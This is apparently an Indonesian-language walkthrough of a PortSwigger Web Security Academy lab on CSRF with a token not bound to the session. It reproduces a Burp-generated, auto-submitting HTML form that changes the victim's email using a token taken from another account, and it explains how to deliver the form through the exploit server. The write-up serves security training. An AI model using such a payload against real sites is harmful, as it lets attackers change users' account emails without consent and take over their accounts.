
# CSRF where token is not tied to user session

Fungsi untuk mengubah email dalam lab ini **rentan terhadap serangan CSRF**. Aplikasi berusaha menggunakan token untuk mencegah serangan CSRF, namun token tersebut **tidak terintegrasi dengan sistem sesi** yang digunakan oleh situs.

**Untuk menyelesaikan lab**, gunakan exploit server Anda untuk menayangkan halaman HTML yang melakukan **serangan CSRF** untuk mengubah alamat email pengunjung.

Anda memiliki dua akun di aplikasi yang dapat Anda gunakan untuk membantu menyusun serangan:
```
Username: wiener
Password: peter
```
```
Username: carlos
Password: montoya
```

> **Hint**: Anda tidak dapat mendaftarkan email yang sudah digunakan pengguna lain. Jika Anda mengubah email Anda sendiri saat menguji exploit, pastikan menggunakan alamat yang berbeda untuk exploit akhir yang Anda kirim ke korban.

---

### Referensi
- [Bypassing token validation - PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation)

---

![img](images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/1.png)

---

Dalam skenario ini, request **POST** default untuk mengubah email memiliki parameter `csrf`. Saya **mencegat (intercept)** dan **menghapus** request tersebut agar token CSRF tidak digunakan. Namun sebelum itu, saya membuat **CSRF PoC**:

![img](images/CSRF%20where%20token%20is%20not%20tied%20to%20user%20session/2.png)

Ketika menekan "Engagement tools" > "Generate CSRF PoC" di Burp Suite, didapatkan PoC HTML berikut:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a8d002b036bf12e80d4301200d80079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test9&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="FbQyYrVpBEJETLtQVqXtlLRi69gJg3WR" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Penjelasan Singkat PoC

- Aplikasi menggunakan parameter `csrf`, tapi **tidak memeriksa** apakah token terkait dengan **sesi pengguna** yang login.  
- Anda dapat menggunakan **token** milik akun lain (misal, token didapat dari akun wiener), lalu **memberikannya** ke korban (misal, akun carlos) untuk melakukan request pengubahan email.  
- Browser korban tetap akan **menyertakan cookie sesi** korban, sehingga server menganggap request datang dari korban dan mengubah email mereka.  
- Dengan `<script>` yang menjalankan `document.forms[0].submit();`, form otomatis dikirim tanpa perlu tindakan manual korban.

**Langkah terakhir**: Unggah HTML PoC ini ke **exploit server** dan berikan link-nya ke korban. Saat korban (yang sedang login) mengunjungi link tersebut, email korban akan berhasil diubah.
